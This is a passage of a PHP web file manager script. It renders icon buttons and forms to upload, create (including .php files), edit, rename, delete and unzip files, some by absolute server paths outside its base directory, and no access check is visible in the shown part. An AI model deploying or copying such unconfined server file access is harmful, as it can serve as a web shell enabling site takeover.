-1,0.448 -1,1z" fill="url(#color-2_VGQlJM067vkN_gr2)"></path><rect x="9" y="37" width="30" height="6" fill="url(#color-3_VGQlJM067vkN_gr3)"></rect><path d="M9,33v10l-4.828,-4.828c-0.751,-0.751 -1.172,-1.768 -1.172,-2.829v-2.343c0,-0.552 0.448,-1 1,-1h-4c0.552,0 1,0.448 1,1z" fill="url(#color-4_VGQlJM067vkN_gr4)"></path></g></g></svg></a>';
                        $ext = strtolower(pathinfo($full, PATHINFO_EXTENSION));
                        if (in_array($ext, ['png','jpg','jpeg','jpe','gif','webp','bmp','svg'])) {
                            echo '<a class="btn btn-view img-view" href="?raw=' . h(urlencode($rel)) . '" title="View" aria-label="View"><span class="material-symbols-rounded">visibility</span> VIEW</a>';
                        } else {
            echo '<a class="btn btn-edit" href="?d=' . h(urlencode($rel)) . '&edit=1" title="Edit" aria-label="Edit"><svg class="edit-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="18" height="18" viewBox="0,0,256,256"><defs><linearGradient x1="28.529" y1="15.472" x2="33.6" y2="10.4" gradientUnits="userSpaceOnUse" id="edit_notes_gr1b"><stop offset="0" stop-color="#3079d6"></stop><stop offset="1" stop-color="#297cd2"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(5.33333,5.33333)"><path d="M39,16v25c0,1.105 -0.895,2 -2,2h-26c-1.105,0 -2,-0.895 -2,-2v-34c0,-1.105 0.895,-2 2,-2h17z" fill="#edb90b"></path><path d="M32.5,21h-17c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h17c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path><path d="M30.5,25h-15c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h15c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path><path d="M32.5,29h-17c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h17c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path><path d="M30.5,33h-15c-0.276,0 -0.5,-0.224 -0.5,-0.5v-1c0,-0.276 0.224,-0.5 0.5,-0.5h15c0.276,0 0.5,0.224 0.5,0.5v1c0,0.276 -0.224,0.5 -0.5,0.5z" fill="#057093"></path><path d="M28,5v9c0,1.105 0.895,2 2,2h9z" fill="url(#edit_notes_gr1b)"></path></g></g></svg> Edit</a>';
                        }
            echo '<a class="btn btn-rename" href="?d=' . h(urlencode($rel)) . '&rename=1" title="Rename" aria-label="Rename"><svg class="rename-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="18" height="18" viewBox="0 0 48 48"><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qa_B4pji8Bcxjff_gr1" x1="41" x2="5" y1="44" y2="44" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fed100"></stop><stop offset="1" stop-color="#eb6001"></stop></linearGradient><path fill="url(#Fly~vIrnzLNx4sqnHqi3Qa_B4pji8Bcxjff_gr1)" d="M5,43h35c0.552,0,1,0.448,1,1l0,0c0,0.552-0.448,1-1,1H5V43z"></path><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qb_B4pji8Bcxjff_gr2" x1="10.559" x2="36.15" y1="4.748" y2="30.339" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#ffd747"></stop><stop offset=".482" stop-color="#ffd645"></stop><stop offset="1" stop-color="#f5bc00"></stop></linearGradient><path fill="url(#Fly~vIrnzLNx4sqnHqi3Qb_B4pji8Bcxjff_gr2)" d="M44.419,14.798L33.203,3.581c-0.774-0.774-2.03-0.774-2.805,0L9,24.98L15,33l7.964,6 l21.455-21.398C45.194,16.828,45.194,15.572,44.419,14.798z"></path><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qc_B4pji8Bcxjff_gr3" x1="5.083" x2="13.328" y1="34.215" y2="48.495" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fed100"></stop><stop offset="1" stop-color="#e36001"></stop></linearGradient><path fill="url(#Fly~vIrnzLNx4sqnHqi3Qc_B4pji8Bcxjff_gr3)" d="M5,45c-0.521,0-1.032-0.204-1.414-0.586C3.021,43.849,2.846,43,3.188,42.143l4-10L13,35 l2.8,5.8L5.743,44.857C5.502,44.953,5.25,45,5,45z"></path><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qd_B4pji8Bcxjff_gr4" x1="6.75" x2="20.75" y1="27.25" y2="41.25" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#889097"></stop><stop offset="1" stop-color="#4c5963"></stop></linearGradient><polygon fill="url(#Fly~vIrnzLNx4sqnHqi3Qd_B4pji8Bcxjff_gr4)" points="7.2,32.2 9,25 23,39 15.8,40.8"></polygon></svg> Rename</a>';
                        echo '<a class="btn btn-icon btn-danger" href="?d=' . h(urlencode($rel)) . '&delete=1" aria-label="Delete" title="Delete" data-label="Delete"><svg class="delete-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0,0,256,256"><defs><linearGradient x1="16" y1="2.888" x2="16" y2="29.012" gradientUnits="userSpaceOnUse" id="color-1_nTkpTS1GZpkb_gr1"><stop offset="0" stop-color="#8b0000"></stop><stop offset="0.247" stop-color="#8b0000"></stop><stop offset="0.672" stop-color="#8b0000"></stop><stop offset="1" stop-color="#8b0000"></stop></linearGradient><linearGradient x1="16" y1="10.755" x2="16" y2="21.245" gradientUnits="userSpaceOnUse" id="color-2_nTkpTS1GZpkb_gr2"><stop offset="0" stop-color="#000000" stop-opacity="0.1"></stop><stop offset="1" stop-color="#000000" stop-opacity="0.7"></stop></linearGradient><linearGradient x1="16" y1="3" x2="16" y2="29" gradientUnits="userSpaceOnUse" id="color-3_nTkpTS1GZpkb_gr3"><stop offset="0" stop-color="#000000" stop-opacity="0.02"></stop><stop offset="1" stop-color="#000000" stop-opacity="0.15"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(8,8)"><circle cx="16" cy="16" r="13" fill="url(#color-1_nTkpTS1GZpkb_gr1)"></circle><g fill="url(#color-2_nTkpTS1GZpkb_gr2)" opacity="0.2"><path d="M19.995,10.755c-0.334,0 -0.648,0.13 -0.884,0.366l-3.111,3.111l-3.111,-3.111c-0.236,-0.236 -0.55,-0.366 -0.884,-0.366c-0.334,0 -0.648,0.13 -0.884,0.366c-0.487,0.487 -0.487,1.28 0,1.768l3.111,3.111l-3.111,3.111c-0.487,0.487 -0.487,1.28 0,1.768c0.236,0.236 0.55,0.366 0.884,0.366c0.334,0 0.648,-0.13 0.884,-0.366l3.111,-3.111l3.111,3.111c0.236,0.236 0.55,0.366 0.884,0.366c0.334,0 0.648,-0.13 0.884,-0.366c0.487,-0.487 0.487,-1.28 0,-1.768l-3.111,-3.111l3.111,-3.111c0.487,-0.487 0.487,-1.28 0,-1.768c-0.236,-0.236 -0.55,-0.366 -0.884,-0.366z"></path></g><path d="M16,3.25c7.03,0 12.75,5.72 12.75,12.75c0,7.03 -5.72,12.75 -12.75,12.75c-7.03,0 -12.75,-5.72 -12.75,-12.75c0,-7.03 5.72,-12.75 12.75,-12.75M16,3c-7.18,0 -13,5.82 -13,13c0,7.18 5.82,13 13,13c7.18,0 13,-5.82 13,-13c0,-7.18 -5.82,-13 -13,-13z" fill="url(#color-3_nTkpTS1GZpkb_gr3)"></path><path d="M17.414,16l3.288,-3.288c0.391,-0.391 0.391,-1.024 0,-1.414c-0.391,-0.391 -1.024,-0.391 -1.414,0l-3.288,3.288l-3.288,-3.288c-0.391,-0.391 -1.024,-0.391 -1.414,0c-0.391,0.391 -0.391,1.024 0,1.414l3.288,3.288l-3.288,3.288c-0.391,0.391 -0.391,1.024 0,1.414c0.391,0.391 1.024,0.391 1.414,0l3.288,-3.288l3.288,3.288c0.391,0.391 1.024,0.391 1.414,0c0.391,-0.391 0.391,-1.024 0,-1.414z" fill="#ffffff"></path></g></g></svg></a>';
                        if ($ext === 'zip') { echo '<a class="btn btn-icon btn-unzip" href="?d=' . h(urlencode($rel)) . '&unzip=1" aria-label="Unzip" title="Unzip" data-label="Unzip"><svg class="unzip-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" role="img" aria-label="Unzip"><linearGradient id="unzip_btn_rel_gr1" x1="24" x2="24" y1="18" y2="30" gradientUnits="userSpaceOnUse"><stop offset=".233" stop-color="#41a5ee"></stop><stop offset=".317" stop-color="#3994de"></stop><stop offset=".562" stop-color="#2366b4"></stop><stop offset=".751" stop-color="#154a9b"></stop><stop offset=".86" stop-color="#103f91"></stop></linearGradient><rect width="36" height="12" x="6" y="18" fill="url(#unzip_btn_rel_gr1)"></rect><linearGradient id="unzip_btn_rel_gr2" x1="24" x2="24" y1="6" y2="18" gradientUnits="userSpaceOnUse"><stop offset=".233" stop-color="#e8457c"></stop><stop offset=".272" stop-color="#e14177"></stop><stop offset=".537" stop-color="#b32c59"></stop><stop offset=".742" stop-color="#971e46"></stop><stop offset=".86" stop-color="#8c193f"></stop></linearGradient><path fill="url(#unzip_btn_rel_gr2)" d="M42,18H6V8c0-1.105,0.895-2,2-2h32c1.105,0,2,0.895,2,2V18z"></path><linearGradient id="unzip_btn_rel_gr3" x1="24" x2="24" y1="30" y2="42" gradientUnits="userSpaceOnUse"><stop offset=".233" stop-color="#33c481"></stop><stop offset=".325" stop-color="#2eb173"></stop><stop offset=".566" stop-color="#228353"></stop><stop offset=".752" stop-color="#1b673f"></stop><stop offset=".86" stop-color="#185c37"></stop></linearGradient><path fill="url(#unzip_btn_rel_gr3)" d="M40,42H8c-1.105,0-2-0.895-2-2V30h36v10C42,41.105,41.105,42,40,42z"></path><rect width="14" height="36" x="17" y="6" opacity=".05"></rect><rect width="13" height="36" x="17.5" y="6" opacity=".07"></rect><linearGradient id="unzip_btn_rel_gr4" x1="24" x2="24" y1="6" y2="42" gradientUnits="userSpaceOnUse"><stop offset=".039" stop-color="#f8c819"></stop><stop offset=".282" stop-color="#af4316"></stop></linearGradient><rect width="12" height="36" x="18" y="6" fill="url(#unzip_btn_rel_gr4)"></rect><linearGradient id="unzip_btn_rel_gr5" x1="24" x2="24" y1="12" y2="42" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#eaad29"></stop><stop offset=".245" stop-color="#d98e24"></stop><stop offset=".632" stop-color="#c0631c"></stop><stop offset=".828" stop-color="#b75219"></stop><stop offset=".871" stop-color="#a94917"></stop><stop offset=".949" stop-color="#943b13"></stop><stop offset="1" stop-color="#8c3612"></stop></linearGradient><path fill="url(#unzip_btn_rel_gr5)" d="M24,12c-3.314,0-6,2.686-6,6v24h12V18C30,14.686,27.314,12,24,12z"></path><path d="M20,32c-0.73,0-1.41-0.2-2-0.55v1.14c0.61,0.26,1.29,0.41,2,0.41h8c0.71,0,1.39-0.15,2-0.41v-1.14 C29.41,31.8,28.73,32,28,32H20z M29,22v6c0,0.55-0.45,1-1,1h-2v-2c0-1.1-0.9-2-2-2s-2,0.9-2,2v2h-2c-0.55,0-1-0.45-1-1v-6 c0-0.55-0.45-1-1-1v7c0,1.1,0.9,2,2,2h3v-3c0-0.55,0.45-1,1-1s1,0.45,1,1v3h3c1.1,0,2-0.9,2-2v-7C29.45,21,29,21.45,29,22z" opacity=".05"></path><path d="M29.5,22v6c0,0.83-0.67,1.5-1.5,1.5h-2.5V27c0-0.83-0.67-1.5-1.5-1.5s-1.5,0.67-1.5,1.5v2.5H20 c-0.83,0-1.5-0.67-1.5-1.5v-6c0-0.28-0.22-0.5-0.5-0.5V28c0,1.1,0.9,2,2,2h3v-3c0-0.55,0.45-1,1-1s1,0.45,1,1v3h3c1.1,0,2-0.9,2-2 v-6.5C29.72,21.5,29.5,21.72,29.5,22z M20,32c-0.73,0-1.41-0.2-2-0.55v0.58c0.6,0.3,1.28,0.47,2,0.47h8c0.72,0,1.4-0.17,2-0.47 v-0.58C29.41,31.8,28.73,32,28,32H20z" opacity=".07"></path><linearGradient id="unzip_btn_rel_gr6" x1="24" x2="24" y1="21" y2="32" gradientUnits="userSpaceOnUse"><stop offset=".613" stop-color="#e6e6e6"></stop><stop offset=".785" stop-color="#e4e4e4"></stop><stop offset=".857" stop-color="#ddd"></stop><stop offset=".91" stop-color="#d1d1d1"></stop><stop offset=".953" stop-color="#bfbfbf"></stop><stop offset=".967" stop-color="#b8b8b8"></stop></linearGradient><path fill="url(#unzip_btn_rel_gr6)" d="M32,23v5c0,2.2-1.8,4-4,4h-8c-2.2,0-4-1.8-4-4v-5c0-1.105,0.895-2,2-2h0 v7 c0,1.105,0.895,2,2,2h3v-3c0-0.552,0.448-1,1-1h0c0.552,0,1,0.448,1,1v3h3c1.105,0,2-0.895,2-2v-7C31.1,21,32,21.9,32,23z"></path></svg></a>'; }
                        
                    }
                }
                echo '</td>';
                echo '</tr>';
            }
            ?>
            </tbody>
        </table>

        <?php
        // Upload form
        if (isset($_GET['upload'])) {
            echo '<h3 class="section-title"><span class="material-symbols-rounded">file_upload</span> Upload</h3>';
            $relDir = (strpos($currentDir, $BASE_DIR) === 0) ? ltrim(substr($currentDir, strlen($BASE_DIR)), DIRECTORY_SEPARATOR) : '';
            if ($isOutsideBase) {
                $backHref = '?os=' . h(urlencode($currentDir));
                $newHref = '?new=1&os=' . h(urlencode($currentDir));
            } else {
                $backHref = $relDir !== '' ? ('?d=' . h(urlencode($relDir))) : '?';
                $newHref = '?new=1' . ($relDir !== '' ? ('&d=' . h(urlencode($relDir))) : '');
            }
            echo '<div class="upload-row">'
                 . '<a class="btn-icon" href="' . $newHref . '" title="Add" data-label="Add"><span class="material-symbols-rounded">add_circle</span></a>'
                 . '<a class="btn-icon" href="' . $backHref . '" title="Back" data-label="Back"><span class="material-symbols-rounded">arrow_back</span></a>'
                 . '</div>';
            echo '<form method="post" id="inline-upload-form" class="form-wrap" enctype="multipart/form-data" style="text-align:center;">';
            if ($isOutsideBase) {
                echo '<input type="hidden" name="do_upload_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($currentDir) . '">';
            } else {
                echo '<input type="hidden" name="do_upload" value="1">';
                echo '<input type="hidden" name="dir" value="' . h($relDir) . '">';
            }
            echo '<div class="upload-pill" style="margin:12px auto; max-width:480px;">'
                . '<span class="material-symbols-rounded" aria-hidden="true" style="color:#ffffff;">cloud_upload</span>'
                . '<label for="upload-file-inline" class="upload-label" id="upload-label-inline" title="Choose a file…">Choose a file…</label>'
                . '<input type="file" id="upload-file-inline" name="upload" accept="*/*">'
                . '</div>';
            echo '<div class="upload-file-info" style="max-width:520px; margin:6px auto; font-size:12px; color:#cbd5e1; display:flex; align-items:center; gap:8px;">'
                . '<span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:#64748b;">description</span>'
                . '<span>File name: —</span>'
                . '</div>';
            echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Upload"><span class="material-symbols-rounded">check_circle</span></button></p>';
            echo '</form>';
            echo '<script>(function(){ var form=document.getElementById("inline-upload-form"); if(!form) return; var f=form.querySelector("#upload-file-inline"); var pill=form.querySelector(".upload-pill"); var label=form.querySelector(".upload-label"); var info=form.parentNode && form.parentNode.querySelector && form.parentNode.querySelector(".upload-file-info"); if(f&&pill){ pill.addEventListener("click", function(){ f.click(); }); f.addEventListener("change", function(){ if(f.files&&f.files.length){ var name=f.files[0].name||""; if(label){ label.textContent=name; label.title=name; } if(info){ var safe=name.replace(/</g,"&lt;").replace(/>/g,"&gt;"); info.innerHTML = `<span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:#64b5f6;">description</span><span>File name: <span style="color:#93c5fd; font-weight:600;">${safe}</span></span>`; } pill.style.borderColor="#3b82f6"; pill.style.backgroundColor="rgba(59,130,246,0.1)"; } else { if(label){ label.textContent="Choose a file…"; label.title="Choose a file…"; } if(info){ info.innerHTML = `<span class="material-symbols-rounded" aria-hidden="true" style="font-size:16px; color:#64748b;">description</span><span>File name: —</span>`; } pill.style.borderColor=""; pill.style.backgroundColor=""; } }); } })();</script>';
        }
        // New (Create) form
        if (isset($_GET['new'])) {
            echo '<h3 class="section-title"><span class="material-symbols-rounded">add_circle</span> New</h3>';
            echo '<form method="post" class="form-wrap">';
            if ($isOutsideBase) {
                echo '<input type="hidden" name="do_create_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($currentDir) . '">';
            } else {
                echo '<input type="hidden" name="do_create" value="1">';
                $relDir = (strpos($currentDir, $BASE_DIR) === 0) ? ltrim(substr($currentDir, strlen($BASE_DIR)), DIRECTORY_SEPARATOR) : '';
                echo '<input type="hidden" name="dir" value="' . h($relDir) . '">';
            }
            echo '<p style="text-align:center; margin-bottom:12px;">';
            echo '<label style="margin-right:14px;"><input type="radio" name="create_type" value="file" checked> File</label>';
            echo '<label><input type="radio" name="create_type" value="folder"> Folder</label>';
            echo '</p>';
            echo '<div style="display:grid; grid-template-columns: 1fr; gap:12px; justify-items:center;">';
            echo '<div class="input-pill file-only"><span class="material-symbols-rounded">description</span><input type="text" name="file_name" placeholder="File name (base)" autocomplete="off"></div>';
            echo '<div class="input-pill file-only"><span class="material-symbols-rounded">extension</span><select id="file-ext-select" name="file_ext"><option value="php">.php</option><option value="phtml">.phtml</option><option value="html">.html</option><option value="txt">.txt</option></select></div>';
            echo '<div class="input-pill folder-only"><span class="material-symbols-rounded">create_new_folder</span><input type="text" name="folder_name" placeholder="Folder name" autocomplete="off"></div>';
            echo '</div>';
            echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Create"><span class="material-symbols-rounded">check_circle</span></button></p>';
            echo '</form>';
        }
        // View removed per request
        // Edit form
        if (isset($_GET['edit']) && !empty($_GET['d'])) {
            $editPath = safePath($BASE_DIR, (string)$_GET['d']);
            if ($editPath && is_file($editPath)) {
                $content = @file_get_contents($editPath);
                if ($content !== false) {
                    echo '<h3 class="section-title"><span class="material-symbols-rounded">edit_square</span> Edit: ' . h(basename($editPath)) . '</h3>';
                    $relForm = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $editPath), DIRECTORY_SEPARATOR);
                    $actionRel = h(urlencode($relForm));
                    echo '<form method="post" action="?d=' . $actionRel . '&edit=1">';
                    echo '<div class="editor-wrap">';
                    echo '<input type="hidden" name="do_edit" value="1">';
                    echo '<input type="hidden" name="rel" value="' . h($relForm) . '">';
                    echo '<textarea class="editor-area" name="content" rows="18">' . h($content) . '</textarea>';
                    echo '<p class="editor-actions"><button class="icon-action icon-confirm" type="submit" title="Save"><span class="material-symbols-rounded">check_circle</span></button></p>';
                    echo '</div>';
                    echo '</form>';
                } else {
                    echo '<p class="error"><span class="material-symbols-rounded" aria-hidden="true">error</span> Failed to read file.</p>';
                }
            }
        }
        // Edit form (absolute path)
if ($isOutsideBase && isset($_GET['edit_abs']) && !empty($_GET['os'])) {
    $editPath = realpath((string)$_GET['os']);
            if ($editPath !== false && is_file($editPath)) {
                $content = @file_get_contents($editPath);
                if ($content !== false) {
                    echo '<h3 class="section-title"><span class="material-symbols-rounded">edit_square</span> Edit: ' . h(basename($editPath)) . '</h3>';
                    echo '<form method="post" action="?os=' . h(urlencode($editPath)) . '&edit_abs=1">';
                    echo '<div class="editor-wrap">';
                    echo '<input type="hidden" name="do_edit_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($editPath) . '">';
                    echo '<textarea class="editor-area" name="content" rows="18">' . h($content) . '</textarea>';
                    echo '<p class="editor-actions"><button class="icon-action icon-confirm" type="submit" title="Save"><span class="material-symbols-rounded">check_circle</span></button></p>';
                    echo '</div>';
                    echo '</form>';
                } else {
                    echo '<p class="error"><span class="material-symbols-rounded" aria-hidden="true">error</span> Failed to read file.</p>';
                }
            }
        }
        // Rename form (file or folder)
        if (isset($_GET['rename']) && !empty($_GET['d'])) {
            $rnPath = safePath($BASE_DIR, (string)$_GET['d']);
            if ($rnPath && (is_file($rnPath) || is_dir($rnPath))) {
                echo '<h3 class="section-title"><span class="material-symbols-rounded">drive_file_rename_outline</span> Rename: ' . h(basename($rnPath)) . '</h3>';
                echo '<form method="post" class="form-wrap">';
                echo '<input type="hidden" name="do_rename" value="1">';
                $relForm = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $rnPath), DIRECTORY_SEPARATOR);
                echo '<input type="hidden" name="rel" value="' . h($relForm) . '">';
                echo '<div class="input-pill"><span class="material-symbols-rounded">drive_file_rename_outline</span><input type="text" name="newname" value="' . h(basename($rnPath)) . '" autocomplete="off"></div>';
                echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Rename"><span class="material-symbols-rounded">check_circle</span></button></p>';
                echo '</form>';
            }
        }
        // Rename form (absolute)
if ($isOutsideBase && isset($_GET['rename_abs']) && !empty($_GET['os'])) {
    $rnPath = realpath((string)$_GET['os']);
            if ($rnPath !== false && (is_file($rnPath) || is_dir($rnPath))) {
                echo '<h3 class="section-title"><span class="material-symbols-rounded">drive_file_rename_outline</span> Rename: ' . h(basename($rnPath)) . '</h3>';
                echo '<form method="post" class="form-wrap">';
                echo '<input type="hidden" name="do_rename_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($rnPath) . '">';
                echo '<div class="input-pill"><span class="material-symbols-rounded">drive_file_rename_outline</span><input type="text" name="newname" value="' . h(basename($rnPath)) . '" autocomplete="off"></div>';
                echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Rename"><span class="material-symbols-rounded">check_circle</span></button></p>';
                echo '</form>';
            }
        }

        // Delete form (file or folder)
        if (isset($_GET['delete']) && !empty($_GET['d'])) {
            $delPath = safePath($BASE_DIR, (string)$_GET['d']);
            if ($delPath && (is_file($delPath) || is_dir($delPath))) {
                $isD = is_dir($delPath);
                echo '<h3 class="section-title"><span class="material-symbols-rounded">delete_forever</span> Delete: ' . h(basename($delPath)) . '</h3>';
                echo '<p class="error error-center"><span class="material-symbols-rounded" aria-hidden="true">warning</span> This will permanently delete the ' . ($isD ? 'folder and all its contents' : 'file') . '. There is no undo.</p>';
                echo '<form method="post">';
                echo '<input type="hidden" name="do_delete" value="1">';
                $relForm = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $delPath), DIRECTORY_SEPARATOR);
                echo '<input type="hidden" name="rel" value="' . h($relForm) . '">';
                $cancelRel = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', dirname($delPath)), DIRECTORY_SEPARATOR);
                echo '<p class="form-actions">'
                    . '<button type="submit" class="icon-action icon-confirm" title="Confirm delete"><span class="material-symbols-rounded">check_circle</span></button> '
                    . '<a class="icon-action icon-cancel" href="?d=' . h(urlencode($cancelRel)) . '" title="Cancel"><span class="material-symbols-rounded">cancel</span></a>'
                    . '</p>';
                echo '</form>';
            }
        }
        // Delete form (absolute)
if ($isOutsideBase && isset($_GET['delete_abs']) && !empty($_GET['os'])) {
    $delPath = realpath((string)$_GET['os']);
            if ($delPath !== false && (is_file($delPath) || is_dir($delPath))) {
                $isD = is_dir($delPath);
                echo '<h3 class="section-title"><span class="material-symbols-rounded">delete_forever</span> Delete: ' . h(basename($delPath)) . '</h3>';
                echo '<p class="error error-center"><span class="material-symbols-rounded" aria-hidden="true">warning</span> This will permanently delete the ' . ($isD ? 'folder and all its contents' : 'file') . '. There is no undo.</p>';
                echo '<form method="post">';
                echo '<input type="hidden" name="do_delete_abs" value="1">';
echo '<input type="hidden" name="os" value="' . h($delPath) . '">';
                $cancelAbs = dirname($delPath);
                echo '<p class="form-actions">'
                    . '<button type="submit" class="icon-action icon-confirm" title="Confirm delete"><span class="material-symbols-rounded">check_circle</span></button> '
                    . '<a class="icon-action icon-cancel" href="?os=' . h(urlencode($cancelAbs)) . '" title="Cancel"><span class="material-symbols-rounded">cancel</span></a>'
                    . '</p>';
                echo '</form>';
            }
        }

        // Unzip form
        if (isset($_GET['unzip']) && !empty($_GET['d'])) {
            $zipPath = safePath($BASE_DIR, (string)$_GET['d']);
            if ($zipPath && is_file($zipPath) && strtolower(pathinfo($zipPath, PATHINFO_EXTENSION)) === 'zip') {
                $defaultFolder = pathinfo($zipPath, PATHINFO_FILENAME);
                // Gather up to 200 entries from the zip for animation
                $unzEntries = [];
                if (class_exists('ZipArchive')) {
                    $tmpZip = new ZipArchive();
                    if (@$tmpZip->open($zipPath) === true) {
                        $limit = 200;
                        for ($i = 0; $i < $tmpZip->numFiles && $i < $limit; $i++) {
                            $name = (string)$tmpZip->getNameIndex($i);
                            if ($name !== '') { $unzEntries[] = $name; }
                        }
                        @$tmpZip->close();
                    }
                }
                $unzJson = h(json_encode($unzEntries));
                echo '<h3 class="section-title" style="text-align:center;"><svg class="unzip-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" role="img" aria-label="Unzip"><linearGradient id="unzip_form_rel_gr1" x1="9.722" x2="36.896" y1="9.722" y2="36.896" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#f44f5a"/><stop offset=".443" stop-color="#ee3d4a"/><stop offset="1" stop-color="#e52030"/></linearGradient><path fill="url(#unzip_form_rel_gr1)" d="M13.42,40.014l-8.824-15c-0.368-0.626-0.368-1.402,0-2.028l8.824-15 C13.779,7.375,14.435,7,15.144,7h17.712c0.709,0,1.365,0.375,1.724,0.986l8.824,15c0.368,0.626,0.368,1.402,0,2.028l-8.824,15 C34.221,40.625,33.565,41,32.856,41H15.144C14.435,41,13.779,40.625,13.42,40.014z"/></svg> Unzip: ' . h(basename($zipPath)) . '</h3>';
                echo '<form method="post" class="form-wrap" id="unzip-form" data-entries="' . $unzJson . '" style="text-align:center;">';
                echo '<input type="hidden" name="do_unzip" value="1">';
                $relForm = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $zipPath), DIRECTORY_SEPARATOR);
                echo '<input type="hidden" name="rel" value="' . h($relForm) . '">';
                echo '<div class="input-pill" style="margin:12px auto; max-width:480px;"><span class="material-symbols-rounded">create_new_folder</span><input type="text" name="folder" value="' . h($defaultFolder) . '" placeholder="Extract to folder" autocomplete="off"></div>';
                echo '<p class="form-actions"><button class="icon-action icon-confirm" type="submit" title="Unzip"><span class="material-symbols-rounded">check_circle</span></button></p>';
                echo '</form>';
                if (!empty($unzEntries)) {
                    echo '<div class="unz-preview" style="max-width:560px; margin:8px auto; display:grid; grid-template-columns: 1fr; gap:6px; text-align:left;">';
                    $shown = 0; $limit = 50;
                    foreach ($unzEntries as $entry) {
                        if ($shown >= $limit) { break; }
                        $isDirEntry = substr($entry, -1) === '/';
                        $disp = $isDirEntry ? rtrim($entry, '/') : basename($entry);
                        if ($isDirEntry) {
                            $i = '<span class="material-symbols-rounded ic-folder">folder</span>';
                        } else {
                            $ext2 = strtolower(pathinfo($disp, PATHINFO_EXTENSION));
                            if (in_array($ext2, ['mp3','wav','flac','m4a','aac','ogg','opus'], true)) { $i = '<span class="material-symbols-rounded ic-audio">audio_file</span>'; }
                            elseif (in_array($ext2, ['mp4','webm','mkv','mov','avi','wmv','mpg','mpeg','3gp','3gpp'], true)) { $i = '<span class="material-symbols-rounded ic-video">video_file</span>'; }
                            elseif (in_array($ext2, ['jpg','jpeg','png','gif','webp','bmp','svg'], true)) { $i = '<span class="material-symbols-rounded ic-image">image</span>'; }
                            elseif ($ext2 === 'zip') { $i = '<svg class="zip-icon" viewBox="0 0 24 24" role="img" aria-label="ZIP"><rect x="5" y="3" width="14" height="6" rx="2" fill="#8a2be2"/><rect x="5" y="9" width="14" height="6" rx="2" fill="#1e90ff"/><rect x="5" y="15" width="14" height="6" rx="2" fill="#32cd32"/><rect x="10.5" y="3" width="3" height="18" rx="1.5" fill="#cfa15c"/><rect x="10.5" y="9" width="3" height="2" rx="1" fill="#b6893f"/></svg>'; }
                            elseif ($ext2 === 'txt') { $i = '<span class="material-symbols-rounded ic-txt">sticky_note_2</span>'; }
                            elseif ($ext2 === 'php') { $i = '<i class="fa-brands fa-php ic-php"></i>'; }
                            elseif ($ext2 === 'html' || $ext2 === 'htm') { $i = '<i class="fa-brands fa-html5 ic-html"></i>'; }
                            elseif ($ext2 === 'js') { $i = '<i class="fa-brands fa-js ic-js"></i>'; }
                            elseif ($ext2 === 'css') { $i = '<i class="fa-brands fa-css3 ic-css"></i>'; }
                            elseif ($ext2 === 'py') { $i = '<i class="fa-brands fa-python ic-python"></i>'; }
                            else { $i = '<span class="material-symbols-rounded ic-file">file_present</span>'; }
                        }
                        echo '<div class="unz-item" style="display:flex; align-items:center; gap:8px;"><span class="th-icon" aria-hidden="true">' . $i . '</span><span class="name-ellipsis" title="' . h($disp) . '">' . h($disp) . '</span></div>';
                        $shown++;
                    }
                    if (count($unzEntries) > $limit) { echo '<div class="muted" style="font-size:12px;">…</div>'; }
                    echo '</div>';
                }
            }
        }
        // Unzip form (absolute)
if ($isOutsideBase && isset($_GET['unzip_abs']) && !empty($_GET['os'])) {
    $zipPath = realpath((string)$_GET['os']);
            if ($zipPath !== false && is_file($zipPath) && strtolower(pathinfo($zipPath, PATHINFO_EXTENSION)) === 'zip') {
